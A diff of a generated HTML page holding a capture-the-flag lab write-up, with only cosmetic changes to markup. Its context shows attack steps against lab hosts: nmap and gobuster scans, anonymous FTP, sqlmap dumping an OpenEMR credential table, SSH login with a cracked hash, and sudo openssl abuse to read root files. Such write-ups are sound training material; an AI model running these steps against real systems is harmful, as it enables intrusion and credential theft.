@@ -4,7 +4,7 @@ AEC
 |
 SkillsTest V1
 </title>
-<meta charset=utf-8><meta name=generator content="Hugo 0.87.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta charset=utf-8><meta name=generator content="Hugo 0.88.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name=description content="
       Vmricdb sw se gzqd, azozc fm mgxzp addkrcgjdvz.
 
@@ -121,7 +121,7 @@ animated fadeInDown">
 </ul>
 </li>
 </ul>
-<pre><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
+<pre tabindex=0><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
 └─$ nmap -A 192.168.118.130
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 12:19 GMT
 Nmap scan report for 192.168.118.130
@@ -211,7 +211,7 @@ Nmap done: 1 IP address (1 host up) scanned in 88.50 seconds
 <hr>
 <h3 id=port-21-ftp>Port 21 FTP:</h3>
 <p>The previous Nmap scan incidicated that the FTP service was running on port 21. It also stated that anonymous login is permitted.</p>
-<pre><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
+<pre tabindex=0><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
 └─$ ftp 192.168.118.130:80
 ftp: 192.168.118.130:80: Name or service not known
 ftp&gt; exit
@@ -362,7 +362,7 @@ The Flag is CUEH:{anonymous_ftp_access}
 <blockquote>
 <p>For this challenge, we have been provided with details privesc:privesc for SSH.</p>
 </blockquote>
-<pre><code class=language-term data-lang=term>┌──(user㉿kali)-[~/Desktop/Event/Build-a-CTF_Event]
+<pre tabindex=0><code class=language-term data-lang=term>┌──(user㉿kali)-[~/Desktop/Event/Build-a-CTF_Event]
 └─$ ssh privesc@192.168.118.130
 privesc@192.168.118.130's password: 
 Linux 8dd4379b5499 5.4.82-0-virt #1-Alpine SMP Thu, 10 Dec 2020 08:58:01 UTC x86_64
@@ -469,7 +469,7 @@ root.txt
 <p>245ST2_Notes.md</p>
 <p>IP ADDRESS: 192.168.119.132</p>
 <p>NMap Scan:</p>
-<pre><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
+<pre tabindex=0><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
 └─$ nmap -sVC -T4 -p- 192.168.118.132
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 13:06 BST
 Nmap scan report for 192.168.118.132
@@ -514,7 +514,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.79 seconds
 <blockquote>
 <p>Gobuster on the site</p>
 </blockquote>
-<pre><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
+<pre tabindex=0><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
 └─$ gobuster dir -u http://192.168.118.132 -w /usr/share/wordlists/dirb/common.txt -x php,html
 ===============================================================
 Gobuster v3.1.0
@@ -573,7 +573,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
                                                     
 </code></pre><p>I navigate to the admin page and get given the version of openEMR. Time to look up the Real World writeup.</p>
 <p><img src=https://i.imgur.com/oKLIY1P.png alt="OpenEMR Vuln page"></p>
-<pre><code class=language-term data-lang=term>                                                                                                                                                                                                                                            
+<pre tabindex=0><code class=language-term data-lang=term>                                                                                                                                                                                                                                            
 ┌──(user㉿kali)-[~]
 └─$ sqlmap -r openemr.req --threads=10 -D openemr --tables                                                                                                                                                                              1 ⨯
         ___
@@ -652,7 +652,7 @@ Database: openemr
 </code></pre><blockquote>
 <p>Here we can see the users_secure table, which from the report we know to look into.</p>
 </blockquote>
-<pre><code class=language-TERM data-lang=TERM>┌──(user㉿kali)-[~]
+<pre tabindex=0><code class=language-TERM data-lang=TERM>┌──(user㉿kali)-[~]
 └─$ sqlmap -r openemr.req --threads=10 -D openemr -T users_secure --dump
         ___
        __H__                                                                                                                                                                                                                                
@@ -712,7 +712,7 @@ Table: users_secure
 </code></pre><blockquote>
 <p>We can crack the hash and ssh to the server</p>
 </blockquote>
-<pre><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
+<pre tabindex=0><code class=language-term data-lang=term>┌──(user㉿kali)-[~]
 └─$ ssh sysadmin@192.168.118.132                                                                                                                                                                                                      255 ⨯
 The authenticity of host '192.168.118.132 (192.168.118.132)' can't be established.
 ECDSA key fingerprint is SHA256:ZRkVNFCQPSUG1pbyc7qQXrxEY0uaOJ9FnfmpJ9Egjz0.
@@ -734,7 +734,7 @@ sysadmin@93e4ad68c07c:~$ cat user.txt
 </code></pre><blockquote>
 <p>In order to get the root flag it was improtatnt to use sudo -l.</p>
 </blockquote>
-<pre><code class=language-term data-lang=term>sysadmin@93e4ad68c07c:~$ sudo -l
+<pre tabindex=0><code class=language-term data-lang=term>sysadmin@93e4ad68c07c:~$ sudo -l
 
 We trust you have received the usual lecture from the local System
 Administrator. It usually boils down to these three things:
@@ -752,7 +752,7 @@ User sysadmin may run the following commands on 93e4ad68c07c:
 </code></pre><blockquote>
 <p>Then going to GTFO bins we can find the method to read files using sudo with openssl</p>
 </blockquote>
-<pre><code class=language-term data-lang=term>sysadmin@93e4ad68c07c:~$ openssl enc -in &quot;/root/root.txt&quot;
+<pre tabindex=0><code class=language-term data-lang=term>sysadmin@93e4ad68c07c:~$ openssl enc -in &quot;/root/root.txt&quot;
 Can't open /root/root.txt for reading, Permission denied
 140438538339456:error:0200100D:system library:fopen:Permission denied:../crypto/bio/bss_file.c:69:fopen('/root/root.txt','rb')
 140438538339456:error:2006D002:BIO routines:BIO_new_file:system lib:../crypto/bio/bss_file.c:78:
